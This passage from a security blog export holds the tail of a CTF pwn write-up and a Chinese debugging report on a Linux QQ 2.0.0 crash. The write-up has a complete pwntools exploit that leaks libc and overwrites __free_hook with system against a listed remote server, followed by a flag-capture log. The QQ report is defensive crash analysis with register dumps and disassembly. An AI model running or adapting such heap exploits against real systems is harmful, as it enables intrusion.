AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;\tx = &quot;free x&quot;; // free x\t// leak libc\tputs(&quot;AAAAAAAA&quot;);&#125;;func error_exit &#123;\tarray arr(1);\tarr[2] = 0;&#125;;leak_libc();write_to_target(t_addr);\n\n\n\n交互exp#!/usr/bin/env python3#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osimport base64import structr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;./ParseC&#x27;libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;#libc_path = &#x27;/glibc/2.27/64/lib/libc.so.6&#x27;main_arena = 0x3ebc40# remote server ip and portserver_ip = &quot;123.57.4.93&quot;server_port = 34007# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def float_to_hex(f):\treturn hex(struct.unpack(&#x27;&lt;I&#x27;, struct.pack(&#x27;&lt;f&#x27;, f))[0])def double_to_hex(f):    return hex(struct.unpack(&#x27;&lt;Q&#x27;, struct.pack(&#x27;&lt;d&#x27;, f))[0]) def double_to_long_int(f):    return struct.unpack(&#x27;&lt;Q&#x27;, struct.pack(&#x27;&lt;d&#x27;, f))[0]def hex_to_double(d):\td = p64(d)\tdata = struct.unpack(&quot;d&quot;, d[:8])\treturn data\t#--------------------------exploit--------------------------print(&#x27;double_hex: &#x27; + double_to_hex(1.0))print(hex_to_double(0x3ff0000000000000))print(hex_to_double(0x1000))def exploit():\tli(&#x27;exploit...&#x27;)\tif(LOCAL == 0):\t\tfd = open(&#x27;./exp.c&#x27;, &#x27;rb&#x27;)\t\td = fd.read()\t\tfd.close()\t\tsla(&#x27;:&#x27;, base64.b64encode(d))\t\tru(&#x27;-------------------------------------------------------\\n&#x27;)\t\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - main_arena - 1184\tli(&#x27;libc_base: &#x27; + hex(libc_base))\t#target = libc_base + libc.sym[&#x27;__malloc_hook&#x27;] - 0x28\ttarget = libc_base + libc.sym[&#x27;__free_hook&#x27;] - 0x28\tgadget = [0x4f3c2, 0x10a45c]\tone_gadget = libc_base + gadget[0]\tone_gadget = libc_base + libc.sym[&#x27;system&#x27;]\tt = str(hex_to_double(target)).split(&#x27;,&#x27;)[0][1:]\to = str(hex_to_double(one_gadget)).split(&#x27;,&#x27;)[0][1:]\tli(&#x27;target = &#x27; + hex(target) + &#x27; double: &#x27; + t)\tli(&#x27;one_gadget = &#x27; + hex(one_gadget) + &#x27; double: &#x27; + o)\tdb()\tsleep(1)\tt = t.ljust(0x20, &#x27;\\x00&#x27;)\ts(t)\tru(&#x27;chunk&#x27;)\tsleep(1)\to = o.ljust(0x20, &#x27;\\x00&#x27;)\t#for _ in range(2):\ts(o)def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process([&#x27;exp.c&#x27;], env = &#123;&#x27;LD_PRELOAD&#x27; : libc_path&#125;)\t\t\t#io = elf.process()\t\telse:\t\t\tio = elf.process()\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n\n\nCongratulations,please input your token: $ icq2383351cba441087032e259a726b5[DEBUG] Sent 0x21 bytes:    &#x27;icq2383351cba441087032e259a726b5\\n&#x27;[DEBUG] Received 0x26 bytes:    &#x27;flag&#123;d90118536dc642041ba9dfa4fc47f28f&#125;&#x27;flag&#123;d90118536dc642041ba9dfa4fc47f28f&#125;[DEBUG] Received 0x37 bytes:\n","categories":["ctf"],"tags":["pwn"]},{"title":"linux qq 崩溃调试分析","url":"/2020/10/30/security/bug/qq-linux-vul-report/","content":"linux qq 崩溃调试分析QQ调试报告调试者I0gan\nblog: http://i0gan.cn\ngithub: https://github.com/i0gan\n保护┌[logan☮arch]-(/usr/bin)└&gt; checksec qq[!] Unknown configuration section &#x27;update&#x27;[*] &#x27;/usr/bin/qq&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled    FORTIFY:  Enabled\n\n\n\n问题qq在登录之后在拉去消息和好友列表时出现段错误, 在反映比较慢的电脑上出现几率比较小, 在反映过快的电脑中, 每次基本都直接崩溃.\n影响版本2.0.0\n原因多线程条件竞争, 导致对象释放重利用, 然而在调用该函数指针时, 会出现内存地址非法调用\n证实: 调试时, 在登录之后, 只运行主线程, 阻断其他线程运行, 能够成功保证登录之后不会崩溃, 只是接受不了消息\n其他由于代码量比较大, 时间性的原因, 只能先暂时提供一下调试信息, 后期会不断更新调试结果, 找出对于的具体漏洞所在\n触发段错误漏洞代码块偏移0xbfdfa0     (vul 1)\n0xCCB500   (vul 2)\n调试收到系统信号: sigsegv\n线程信息:pwndbg&gt; info threads  Id   Target Id                                          Frame   1    Thread 0x7ffff6964940 (LWP 6251) &quot;qq&quot;              0x00007ffff7ce49e5 in g_main_context_dispatch () from /usr/lib/libglib-2.0.so.0  2    Thread 0x7ffff6963640 (LWP 6258) &quot;qq&quot;              0x00007ffff7e376a2 in pthread_cond_wait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0  3    Thread 0x7ffff6162640 (LWP 6259) &quot;ThreadPoolServi&quot; 0x00007ffff70485de in epoll_wait () from /usr/lib/libc.so.6  5    Thread 0x7ffff5160640 (LWP 6261) &quot;Qnox_LogicThrea&quot; 0x00007ffff70485de in epoll_wait () from /usr/lib/libc.so.6  6    Thread 0x7ffff495f640 (LWP 6262) &quot;Qnox_IOThread&quot;   0x00007ffff70485de in epoll_wait () from /usr/lib/libc.so.6  7    Thread 0x7ffff415e640 (LWP 6263) &quot;ThreadPoolForeg&quot; 0x00007ffff7e379c8 in pthread_cond_timedwait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0  10   Thread 0x7ffff215a640 (LWP 6267) &quot;inotify_reader&quot;  0x00007ffff703fb7b in select () from /usr/lib/libc.so.6  14   Thread 0x7ffff094f640 (LWP 6270) &quot;qq&quot;              0x00007ffff7e376a2 in pthread_cond_wait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0  16   Thread 0x7ffff1158640 (LWP 6290) &quot;ThreadPoolForeg&quot; 0x0000555555ff85a0 in ?? ()  17   Thread 0x7ffff1959640 (LWP 6291) &quot;ThreadPoolForeg&quot; 0x00007ffff7e379c8 in pthread_cond_timedwait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0  18   Thread 0x7ffff295b640 (LWP 6292) &quot;ThreadPoolForeg&quot; 0x00007ffff7e379c8 in pthread_cond_timedwait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0  19   Thread 0x7ffff315c640 (LWP 6293) &quot;ThreadPoolForeg&quot; 0x0000555556000aa0 in ?? ()  20   Thread 0x7ffff395d640 (LWP 6294) &quot;gmain&quot;           0x00007ffff703d46f in poll () from /usr/lib/libc.so.6  21   Thread 0x7fffee64f640 (LWP 6295) &quot;pool-qq&quot;         0x00007ffff7042d5d in syscall () from /usr/lib/libc.so.6* 22   Thread 0x7fffede4e640 (LWP 6296) &quot;gdbus&quot;           0x00007ffff7ce49e5 in g_main_context_dispatch () from /usr/lib/libglib-2.0.so.0\n\n\n\n段错误主线程段错误信号\nThread 1 &quot;qq&quot; received signal SIGSEGV, Segmentation fault.0x00007ffff7ce49e5 in g_main_context_dispatch () from /usr/lib/libglib-2.0.so.0\n\n调试如下\n────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────── RAX  0x0 RBX  0x7ffff7000000 (____wcstof128_l_internal+1168) ◂— adc    eax, 0x748b0000 RCX  0x7ffff7d42938 ◂— 0x6f5347007065656b /* &#x27;keep&#x27; */ RDX  0x7ffff7e450a0 (__pthread_keys) ◂— 0x1 RDI  0x134a77fdde60 ◂— 0xffffecb700000002 RSI  0x7ffff7ce498d (g_main_context_dispatch+493) ◂— mov    rdi, qword ptr [rsp + 0x18] R8   0x134a7710b520 ◂— 0x0 R9   0x7fffffffd880 ◂— 0x3000000028 /* &#x27;(&#x27; */ R10  0x7ffff7fca080 R11  0x286 R12  0x1 R13  0x134a77743890 ◂— 0x0 R14  0x134a77109dc0 ◂— 0x0 R15  0x0 RBP  0x134a774f4bd0 —▸ 0x134a77fdde60 ◂— 0xffffecb700000002 RSP  0x7fffffffd970 —▸ 0x134a77fdde60 ◂— 0xffffecb700000002 RIP  0x7ffff7ce49e5 (g_main_context_dispatch+581) ◂— call   qword ptr [rbx + 8]──────────────────────────────────────────[ DISASM ]────────────────────────────────────────── ► 0x7ffff7ce49e5 &lt;g_main_context_dispatch+581&gt;    call   qword ptr [rbx + 8]        rdi: 0x134a77fdde60 ◂— 0xffffecb700000002        rsi: 0x7ffff7ce498d (g_main_context_dispatch+493) ◂— mov    rdi, qword ptr [rsp + 0x18]        rdx: 0x7ffff7e450a0 (__pthread_keys) ◂— 0x1        rcx: 0x7ffff7d42938 ◂— 0x6f5347007065656b /* &#x27;keep&#x27; */\n\nrbx + 8内存\npwndbg&gt; x /40gx $rbx + 80x7ffff7000008 &lt;____wcstof128_l_internal+1176&gt;: 0x2444c74820245c89      0x0ff68500000000580x7ffff7000018 &lt;____wcstof128_l_internal+1192&gt;: 0xef894c00001c968e      0x448d4c58244c8d480x7ffff7000028 &lt;____wcstof128_l_internal+1208&gt;: 0xf90ee8ea89485024      0x8b44ff438d48ffff0x7ffff7000038 &lt;____wcstof128_l_internal+1224&gt;: 0xdcacbd0f4c20245c      0x2444894800001b580x7ffff7000048 &lt;____wcstof128_l_internal+1240&gt;: 0xed85453ff5834918      0x8b48000012c4850f0x7ffff7000058 &lt;____wcstof128_l_internal+1256&gt;: 0x48240c6348582454      0x01fb834850244c89\n\n然而 call   qword ptr [rbx + 8]这条指令就相当于: call 0x2444c74820245c89, 这个地址是非法地址,所以出现段错误\n正常情况调试────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────── RAX  0x0 RBX  0x7ffff7dc33a0 —▸ 0x7ffff7cdf140 ◂— lock add dword ptr [rdi], 1 RCX  0x7ffff7d42938 ◂— 0x6f5347007065656b /* &#x27;keep&#x27; */ RDX  0x7ffff7e450a0 (__pthread_keys) ◂— 0x1 RDI  0x1392c57a14a0 ◂— 0xffffec6f00000002 RSI  0x7ffff7ce498d (g_main_context_dispatch+493) ◂— mov    rdi, qword ptr [rsp + 0x18] R8   0x1392c57a1520 ◂— 0x0 R9   0x7fffffffd880 ◂— 0x3000000028 /* &#x27;(&#x27; */ R10  0x7ffff7fca080 R11  0x286 R12  0x1 R13  0x1392c5ddb900 ◂— 0x0 R14  0x1392c579fdc0 ◂— 0x0 R15  0x0 RBP  0x1392c58e8b60 —▸ 0x1392c57a14a0 ◂— 0xffffec6f00000002 RSP  0x7fffffffd970 —▸ 0x1392c57a14a0 ◂— 0xffffec6f00000002 RIP  0x7ffff7ce49e5 (g_main_context_dispatch+581) ◂— call   qword ptr [rbx + 8]──────────────────────────────────────────[ DISASM ]────────────────────────────────────────── ► 0x7ffff7ce49e5 &lt;g_main_context_dispatch+581&gt;    call   qword ptr [rbx + 8]    0x7ffff7ce49e8 &lt;g_main_context_dispatch+584&gt;    mov    rdi, r14   0x7ffff7ce49eb &lt;g_main_context_dispatch+587&gt;    call   g_mutex_lock &lt;0x7ffff7d32250&gt;\n\n通过以上观察, rbx指向的是0x7ffff7cdf140, 则 rbx + 8内存信息如下\npwndbg&gt; x /40gx $rbx + 80x7ffff7dc33a8: 0x00007ffff7cdf270      0x00007ffff7cdef500x7ffff7dc33b8: 0x0000000000000000      0x00001392c618e0700x7ffff7dc33c8: 0x00007ffff7ce0650      0x0000000000000000\n\n指向的内存如下:\npwndbg&gt; x /40gx 0x00007ffff7cdf2700x7ffff7cdf270: 0x66c30a74012f83f0      0x0000000000841f0f0x7ffff7cdf280: 0xfd894818478b4855      0x7f8b480674c085480x7ffff7cdf290: 0xe95def8948d0ff10      0x001f0f90ffffffc40x7ffff7cdf2a0: 0x2e6690ffffffbbe9      0x0000000000841f0f0x7ffff7cdf2b0: 0x15fffb8953555441      0x48fb6348000e361c0x7ffff7cdf2c0: 0x8b44000e485a158d      0x000001b8c58948200x7ffff7cdf2d0: 0x0587ba0c87c18900      0x25058b48000e49480x7ffff7cdf2e0: 0x0080b88b48000e48      0x4400047fb1e800000x7ffff7cdf2f0: 0xc35c415d5b006589      0x0000000000841f0f0x7ffff7cdf300 &lt;g_clear_handle_id&gt;:     0x1074c08545078b44      0x89440000000007c70x7ffff7cdf310 &lt;g_clear_handle_id+16&gt;:  0x0000441f0fe6ffc7      0x00000000801f0fc30x7ffff7cdf320 &lt;g_get_real_time&gt;:       0x4864f63128ec8348      0x480000002825048b0x7ffff7cdf330 &lt;g_get_real_time+16&gt;:    0x8948c03118244489      0x48000e37e115ffe70x7ffff7cdf340 &lt;g_get_real_time+32&gt;:    0x48000f4240240469      0x24548b48082444030x7ffff7cdf350 &lt;g_get_real_time+48&gt;:    0x002825142b486418      0x28c48348057500000x7ffff7cdf360 &lt;g_get_real_time+64&gt;:    0x66000e372915ffc3      0x0000000000841f0f0x7ffff7cdf370 &lt;g_main_context_query&gt;:  0x495641d789495741      0x41fd89495541ce890x7ffff7cdf380 &lt;g_main_context_query+16&gt;:       0xf38953c589445554      0x2ebee86708ec83480x7ffff7cdf390 &lt;g_main_context_query+32&gt;:       0x854860458b490005      0x31000000c1840fc00x7ffff7cdf3a0 &lt;g_main_context_query+48&gt;:       0x2e6634ebe43145f6      0x0000000000841f0f\n\n单步执行\nRAX  0x0RBX  0x7ffff7dc33a0 —▸ 0x7ffff7cdf140 ◂— lock add dword ptr [rdi], 1RCX  0x7ffff7d42930 ◂— 0x796f7274736564 /* &#x27;destroy&#x27; */RDX  0x7ffff7e450a0 (__pthread_keys) ◂— 0x1RDI  0x99bbfa157a0 ◂— 0xfffff66600000002RSI  0x7ffff7ce498d (g_main_context_dispatch+493) ◂— mov    rdi, qword ptr [rsp + 0x18]R8   0x99bbf7f2380 ◂— 0x0R9   0x7fffede4d9e0 ◂— 0x3000000028 /* &#x27;(&#x27; */R10  0x7ffff7fca080R11  0x286R12  0x0R13  0x99bbf9eb250 ◂— 0x0R14  0x99bbf9f9e70 ◂— 0x0R15  0x1RBP  0x99bbf9fc4e0 —▸ 0x99bbfa157a0 ◂— 0xfffff66600000002RSP  0x7fffede4dac8 —▸ 0x7ffff7ce49e8 (g_main_context_dispatch+584) ◂— mov    rdi, r14RIP  0x7ffff7cdf270 ◂— lock sub dword ptr [rdi], 1► 0x7ffff7cdf270                                  lock sub dword ptr [rdi], 1   ↓  0x7ffff7cdf276                                  ret       ↓  0x7ffff7ce49e8 &lt;g_main_context_dispatch+584&gt;    mov    rdi, r14  0x7ffff7ce49eb &lt;g_main_context_dispatch+587&gt;    call   g_mutex_lock &lt;0x7ffff7d32250&gt;\n\n可以看到, 原来rbx + 8处的内存储存的是一个该处指令的地址, 这里采用lock sub指令进行对线程使用数 - 1, rdi 指向的是被锁的线程.目前为2\nlock前缀指令详解\nLOCK指令前缀会设置处理器的LOCK#信号（译注：这个信号会使总线锁定，阻止其他处理器接管总线访问内存），直到使用LOCK前缀的指令执行结束，这会使这条指令的执行变为原子操作。在多处理器环境下，设置LOCK#信号能保证某个处理器对共享内存的独占使用。LOCK指令前缀只能用于以下指令，并且要求指令目的操作数为内存操作数，如果源操作数为内存操作数，就会产生undefined opcode异常：ADD, ADC, AND, BTC, BTR, BTS, CMPXCHG, CMPXCH8B,CMPXCHG16B, DEC, INC, NEG, NOT, OR, SBB, SUB, XOR, XADD, XCHG。LOCK指令前缀用于其他任何指令时，也会产生如果源操作数为内存操作数，就会产生undefined opcode异常。另外，XCHG指令默认会设置LOCK#信号，无论是否使用LOCK指令前缀。LOCK指令前缀经常用于BTS指令，用来在共享内存进行一次read-modify-write操作。从P6处理器家族开始，如果使用了LOCK指令前缀的指令要访问的目的地址的内容已经缓存在了cache中，那么LOCK#信号一般就不会被设置，但是当前处理器的cache会被锁定，然后缓存一致性（cache coherency ）机制会自动确保操作的原子性。\n\n\n\n从g_main_context_dispatch结束的可疑地址1\n────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────── RAX  0x1 RBX  0x1665cdb9ed01 ◂— 0x0 RCX  0x7fffffffdac0 —▸ 0x1665cdb9edc8 —▸ 0x5555570bdcb0 —▸ 0x55555617bf10 ◂— push   rbp RDX  0x7ffff7da0251 ◂— &#x27;non-blocking&#x27; RDI  0x1665cda0ddc0 ◂— 0x0 RSI  0x1 R8   0x1665cda0f520 ◂— 0x0 R9   0x7fffffffd920 ◂— 0x3000000028 /* &#x27;(&#x27; */ R10  0x7ffff7fca080 R11  0x286 R12  0x7fffffffdce8 ◂— &#x27;2.0.0-b2&#x27; R13  0x7fffffffdc80 —▸ 0x1665cdb9edd0 —▸ 0x5555570bdd00 —▸ 0x55555617bf20 ◂— push   rbp R14  0x0 R15  0x1665cdb8d2d0 —▸ 0x5555570bc718 —▸ 0x555556151e10 ◂— push   rbp RBP  0x7fffffffdb00 —▸ 0x7fffffffdb30 —▸ 0x7fffffffdbc0 —▸ 0x7fffffffdf10 —▸ 0x55555709abe0 ◂— ... RSP  0x7fffffffdac0 —▸ 0x1665cdb9edc8 —▸ 0x5555570bdcb0 —▸ 0x55555617bf10 ◂— push   rbp RIP  0x55555615201a ◂— jne    0x555556152063──────────────────────────────────────────[ DISASM ]──────────────────────────────────────────   0x7ffff7ce3144 &lt;g_main_context_iteration+68&gt;    pop    rbp   0x7ffff7ce3145 &lt;g_main_context_iteration+69&gt;    pop    r12   0x7ffff7ce3147 &lt;g_main_context_iteration+71&gt;    ret        ↓   0x555556152012                                  mov    rcx, qword ptr [r15 + 8]   0x555556152016                                  cmp    byte ptr [rcx + 8], 0 ► 0x55555615201a                                  jne    0x555556152063    ↓   0x55555615201e                                  setne  bl   0x555556152021                                  mov    rdi, qword ptr [rcx]   0x555556152024                                  mov    rax, qword ptr [rdi]   0x555556152027                                  call   qword ptr [rax + 0x20]    0x55555615202a                                  mov    rcx, qword ptr [r15 + 8]\n\n\n\n程序vmmap\n0x555555554000     0x555555b69000 r--p   615000 0      /opt/tencent-qq/qq   0x555555b69000     0x5555570a6000 r-xp  153d000 614000 /opt/tencent-qq/qq   0x5555570a6000     0x55555710d000 r--p    67000 1b50000 /opt/tencent-qq/qq   0x55555710d000     0x555557119000 rw-p     c000 1bb6000 /opt/tencent-qq/qq   0x555557119000     0x55555717a000 rw-p    61000 0      [heap]   ....\n\n程序基址为: 0x555555554000\npwndbg&gt; p /x 0x555556152012 - 0x555555554000$4 = 0xbfe012\n\n\n\n可疑问题偏移地址:\n0xbfe012\n找到该调处用汇编代码如下:\n0x00bfdfa0      push rbp0x00bfdfa1      mov rbp, rsp0x00bfdfa4      push r150x00bfdfa6      push r140x00bfdfa8      push rbx0x00bfdfa9      sub rsp, 0x280x00bfdfad      mov r15, rdi0x00bfdfb0      movaps xmm0, xmmword [0x00122f40]0x00bfdfb7      movaps xmmword [rbp - 0x40], xmm00x00bfdfbb      xorps xmm0, xmm00x00bfdfbe      movaps xmmword [rbp - 0x30], xmm00x00bfdfc2      mov qword [rbp - 0x40], rsi0x00bfdfc6      mov byte [rbp - 0x38], 00x00bfdfca      mov r14, qword [rdi + 8]0x00bfdfce      test r14, r140x00bfdfd1      je 0xbfdfdc0x00bfdfd3      mov eax, dword [r14 + 0xc]0x00bfdfd7      add eax, 10x00bfdfda      jmp 0xbfdfe10x00bfdfdc      mov eax, 10x00bfdfe1      mov dword [rbp - 0x34], eax0x00bfdfe4      lea rax, [rbp - 0x40]0x00bfdfe8      mov qword [r15 + 8], rax0x00bfdfec      mov rdi, qword [r15 + 0x10]0x00bfdff0      xor esi, esi0x00bfdff2      jmp 0xbfe00d0x00bfdff4      nop word cs:[rax + rax]0x00bfdffe      nop0x00bfe000      test dl, dl0x00bfe002      jne 0xbfe0630x00bfe004      xor al, 10x00bfe006      mov rdi, qword [r15 + 0x10]0x00bfe00a      movzx esi, al0x00bfe00d      call g_main_context_iteration ; sym.imp.g_main_context_iteration ; 调用0x00bfe012      mov rcx, qword [r15 + 8]0x00bfe016      cmp byte [rcx + 8], 00x00bfe01a      jne 0xbfe0630x00bfe01c      test eax, eax0x00bfe01e      setne bl0x00bfe021      mov rdi, qword [rcx]0x00bfe024      mov rax, qword [rdi]0x00bfe027      call qword [rax + 0x20]0x00bfe02a      mov rcx, qword [r15 + 8]0x00bfe02e      mov qword [rcx + 0x10], rax0x00bfe032      mov qword [rcx + 0x18], rdx0x00bfe036      mov rcx, qword [r15 + 8]0x00bfe03a      cmp qword [rcx + 0x10], 00x00bfe03f      sete al0x00bfe042      or al, bl0x00bfe044      movzx edx, byte [rcx + 8]0x00bfe048      test dl, dl0x00bfe04a      jne 0xbfe0000x00bfe04c      test al, al0x00bfe04e      jne 0xbfe0000x00bfe050      mov rdi, qword [rcx]0x00bfe053      mov rax, qword [rdi]0x00bfe056      call qword [rax + 0x38]0x00bfe059      mov rcx, qword [r15 + 8]0x00bfe05d      cmp byte [rcx + 8], 00x00bfe061      je 0xbfe0040x00bfe063      mov qword [r15 + 8], r140x00bfe067      add rsp, 0x280x00bfe06b      pop rbx0x00bfe06c      pop r140x00bfe06e      pop r150x00bfe070      pop rbp0x00bfe071      ret0x00bfe072      int30x00bfe073      int3\n\n\n\nIDA伪c代码\nchar __fastcall sub_BFDFA0(__int64 a1, __int64 a2) //**************  段错误触发函数&#123;  __int64 v2; // r15  __int64 v3; // r14  int v4; // eax  __int64 v5; // rdi  __int64 i; // rsi  __int64 v7; // rax  __int64 v8; // rdx  _BYTE *v9; // rcx  bool v10; // bl  __int64 v11; // rcx  __int64 v12; // rdx  _QWORD *v13; // rcx  __int64 v14; // rdx  __int128 v16; // [rsp+0h] [rbp-40h]  __int128 v17; // [rsp+10h] [rbp-30h]  v2 = a1;  v16 = xmmword_122F40;  v17 = 0LL;  *(_QWORD *)&amp;v16 = a2;  BYTE8(v16) = 0;  v3 = *(_QWORD *)(a1 + 8);  if ( v3 )    v4 = *(_DWORD *)(v3 + 12) + 1;  else    v4 = 1;  HIDWORD(v16) = v4;  *(_QWORD *)(a1 + 8) = &amp;v16;  v5 = *(_QWORD *)(a1 + 16);  for ( i = 0LL; ; i = (unsigned __int8)(v7 ^ 1) )  &#123;    LODWORD(v7) = g_main_context_iteration(v5, i); //**************  段错误触发函数    v9 = *(_BYTE **)(v2 + 8);    if ( v9[8] )      break;    v10 = (_DWORD)v7 != 0;    v7 = (*(__int64 (__cdecl **)(_QWORD, __int64, __int64, _BYTE *))(**(_QWORD **)v9 + 32LL))(*(_QWORD *)v9, i, v8, v9);    v11 = *(_QWORD *)(v2 + 8);    *(_QWORD *)(v11 + 16) = v7;    *(_QWORD *)(v11 + 24) = v12;    v13 = *(_QWORD **)(v2 + 8);    LOBYTE(v7) = v10 || v13[2] == 0LL;    v14 = *((unsigned __int8 *)v13 + 8);    if ( (_BYTE)v14 || (_BYTE)v7 )    &#123;      if ( (_BYTE)v14 )        break;    &#125;    else    &#123;      LOBYTE(v7) = (*(__int64 (__cdecl **)(_QWORD, __int64, __int64, _QWORD *))(*(_QWORD *)*v13 + 56LL))(                     *v13,                     i,                     v14,                     v13);      if ( *(_BYTE *)(*(_QWORD *)(v2 + 8) + 8LL) )        break;    &#125;    v5 = *(_QWORD *)(v2 + 16);  &#125;  *(_QWORD *)(v2 + 8) = v3;  return v7;&#125;\n\n发现在该函数中,没有加入线程锁, 多线程时条件竞争时导致出现内存错误.\n最初漏洞所在: \n在&lt;g_main_context_dispatch+581&gt;    call   qword ptr [rbx + 8]的地方出现内存错误.\n该g_main_context_dispatch函数为g_main_context_iteration所调用\n│  &gt;0x7ffff7ce49b9 &lt;g_main_context_dispatch+537&gt;    lea    r8,[rip+0xbb8c5]│   0x7ffff7ce49c0 &lt;g_main_context_dispatch+544&gt;    lea    rdx,[rip+0x546aa]│   0x7ffff7ce49c7 &lt;g_main_context_dispatch+551&gt;    call   0x7ffff7d34ad0│   0x7ffff7ce49cc &lt;g_main_context_dispatch+556&gt;    mov    rax,QWORD PTR [rsp+0x18]│   0x7ffff7ce49d1 &lt;g_main_context_dispatch+561&gt;    sub    DWORD PTR [r13+0x0],0x1│   0x7ffff7ce49d6 &lt;g_main_context_dispatch+566&gt;    mov    QWORD PTR [r13+0x8],rax│   0x7ffff7ce49da &lt;g_main_context_dispatch+570&gt;    pop    rcx│   0x7ffff7ce49db &lt;g_main_context_dispatch+571&gt;    pop    rsi│   0x7ffff7ce49dc &lt;g_main_context_dispatch+572&gt;    test   rbx,rbx│   0x7ffff7ce49df &lt;g_main_context_dispatch+575&gt;    je     0x7ffff7ce49e8 &lt;g_main_context_dispatch+584&gt;│   0x7ffff7ce49e1 &lt;g_main_context_dispatch+577&gt;    mov    rdi,QWORD PTR [rsp]│   0x7ffff7ce49e5 &lt;g_main_context_dispatch+581&gt;    call   QWORD PTR [rbx+0x8]     //vul│   0x7ffff7ce49e8 &lt;g_main_context_dispatch+584&gt;    mov    rdi,r14\n\n\n\n\n\n► 0x55555615200d    call   g_main_context_iteration@plt &lt;0x5555570a28c0&gt;       rdi: 0x3acdd361fdc0 ◂— 0x0       rsi: 0x0       rdx: 0x7fffffffffffffff       rcx: 0x5555570bdd00 —▸ 0x55555617bf20 ◂— push   rbp\n\n\n\n\n\n调试漏洞函数最后一次状态崩溃前\n RAX  0x0 RBX  0x317f3a79dc01 ◂— 0x0 RCX  0x7fffffffdac0 —▸ 0x317f3a79dc68 —▸ 0x5555570bdcb0 —▸ 0x55555617bf10 ◂— push   rbp RDX  0x0 RDI  0x317f3a648dc0 ◂— 0x0 RSI  0x0 R8   0x317f3a5c8003 ◂— 0x0 R9   0x0 R10  0x7ffff7fca080 R11  0x286 R12  0x7fffffffdce8 ◂— &#x27;2.0.0-b2&#x27; R13  0x7fffffffdc80 —▸ 0x317f3a79dc70 —▸ 0x5555570bdd00 —▸ 0x55555617bf20 ◂— push   rbp R14  0x0 R15  0x317f3a7b8090 —▸ 0x5555570bc718 —▸ 0x555556151e10 ◂— push   rbp RBP  0x7fffffffdb00 —▸ 0x7fffffffdb30 —▸ 0x7fffffffdbc0 —▸ 0x7fffffffdf10 —▸ 0x55555709abe0 ◂— ... RSP  0x7fffffffdab8 —▸ 0x555556152012 ◂— mov    rcx, qword ptr [r15 + 8] RIP  0x7ffff7ce3100 (g_main_context_iteration) ◂— push   r12─────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────── ► 0x7ffff7ce3100 &lt;g_main_context_iteration&gt;       push   r12\n\n\n\n最后一次崩溃g_main_context_iteration的传参\n RAX  0x0 RBX  0x317f3a79dc01 ◂— 0x0 RCX  0x7fffffffdac0 —▸ 0x317f3a79dc68 —▸ 0x5555570bdcb0 —▸ 0x55555617bf10 ◂— push   rbp RDX  0x0 RDI  0x317f3a648dc0 ◂— 0x0 RSI  0x0 R8   0x317f3a5c8003 ◂— 0x0 R9   0x0  ; diff R10  0x17 ; diff R11  0x10 ; diff R12  0x7fffffffdce8 ◂— &#x27;2.0.0-b2&#x27; R13  0x7fffffffdc80 —▸ 0x317f3a79dc70 —▸ 0x5555570bdd00 —▸ 0x55555617bf20 ◂— push   rbp R14  0x0 R15  0x317f3a7b8090 —▸ 0x5555570bc718 —▸ 0x555556151e10 ◂— push   rbp RBP  0x7fffffffdb00 —▸ 0x7fffffffdb30 —▸ 0x7fffffffdbc0 —▸ 0x7fffffffdf10 —▸ 0x55555709abe0 ◂— ... RSP  0x7fffffffdab8 —▸ 0x555556152012 ◂— mov    rcx, qword ptr [r15 + 8] RIP  0x7ffff7ce3100 (g_main_context_iteration) ◂— push   r12─────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────── ► 0x7ffff7ce3100 &lt;g_main_context_iteration&gt;       push   r12    ↓   0x7ffff7ce3105 &lt;g_main_context_iteration+5&gt;     